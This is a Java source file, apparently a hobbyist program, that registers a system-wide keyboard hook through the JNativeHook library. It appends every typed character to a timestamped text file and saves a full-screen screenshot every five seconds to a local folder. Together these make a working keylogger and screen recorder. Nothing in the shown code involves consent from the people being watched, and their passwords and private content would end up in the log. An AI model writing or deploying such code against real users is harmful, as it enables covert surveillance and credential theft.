

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.RenderingHints.Key;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.awt.image.BufferedImage;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
 





import java.security.Timestamp;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Scanner;







import javax.imageio.ImageIO;
import javax.swing.JFrame;
import javax.swing.JTextField;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
 
public class RobotExp1 extends JFrame implements NativeKeyListener {
     
    //private static final KeyListener KeyListener = null;
//static String datestring;
static	String dateAsString1;
	public static void main(String[] args) {
        Scanner sc =new Scanner(System.in);
        
        try {
        	GlobalScreen.registerNativeHook();
            

            /* Construct the example object and initialze native hook. */
            GlobalScreen.addNativeKeyListener(new RobotExp1());
    ///  jt.addKeyListener();
        	// xGlobalScreen.unregisterNativeHook();
            int j=0; 
            Robot robot = new Robot();
         //   SimpleDateFormat fr=new SimpleDateFormat("dd-MM-yyyy  HH:mm:ss");
            
            // Capture the screen shot of the area of the screen defined by the rectangle
      // new jNativeHookExample();
            SimpleDateFormat simpleDateFormat =
    	            new SimpleDateFormat("YYYYmmddhhmmss");
    	 dateAsString1 = simpleDateFormat.format(new Date());
            for(;;){    
    	/*   Date currentDate1 = new Date();  
           System.out.println("Current Date: "+currentDate1); 
           datestring = DateFormat.getDateTimeInstance(DateFormat.LONG,DateFormat.SHORT).format(currentDate1);
           System.out.println(datestring);
           char c[]=datestring.toCharArray();
           char[] k=" ".toCharArray();
           String date="";
           for(int i=0;i<c.length;i++){
        	   if(c[i]!=k[0]){
        		date+=c[i];
        		i++;
        	   }else{
        		   i++;
        	   }
           }
           System.out.println(date);
        	*/
    	  /* java.util.Date date= new java.util.Date();
    	   String d=new Timestamp(date.getTime());
    	   */
    	 
    	String dateAsString = simpleDateFormat.format(new Date());
    	BufferedImage bi=robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            ImageIO.write(bi, "jpg", new File("E:/screen/image"+dateAsString+".jpg"));
            System.out.println("captured"+j);  
         j++;
        robot.delay(5000);
   
   //     JTextField jt=new JTextField();
     
        
   }
        
        
        } catch (NativeHookException ex) {
            /* Its error */
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());
            System.exit(1);
        }
        catch (AWTException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

	
	
	
	public void nativeKeyPressed(NativeKeyEvent e ) {
		if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
		          
			/*try {
						GlobalScreen.unregisterNativeHook();
					} catch (NativeHookException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}
		     */   }
		if (e.getKeyCode() == NativeKeyEvent.VC_CONTROL) {
            try {
				GlobalScreen.registerNativeHook();
			} catch (NativeHookException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
        }
		
	}


	
	public void nativeKeyReleased(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}


	
	public void nativeKeyTyped(NativeKeyEvent e) {
		 System.out.println( e.getKeyText(e.getKeyCode()));
	    	try {
				 
	    		
		          String keyString;
		          keyString = "" + e.getKeyChar() + "";  
		          //For system print console
		          System.out.println(keyString);
		          //For output to file
		         
		          File a =new File("E:/screen/"+dateAsString1+".txt");
		          if (!a.exists()) {
		                a.createNewFile();
		            }
		          FileWriter fw = new FileWriter(a.getAbsoluteFile(),true);
		          BufferedWriter bw = new BufferedWriter(fw);
		          bw.append(keyString);
		          //bw.newLine();
		          bw.close();         
		        } catch (Exception e1) {        
		            e1.printStackTrace();
		        }
		
	}
}
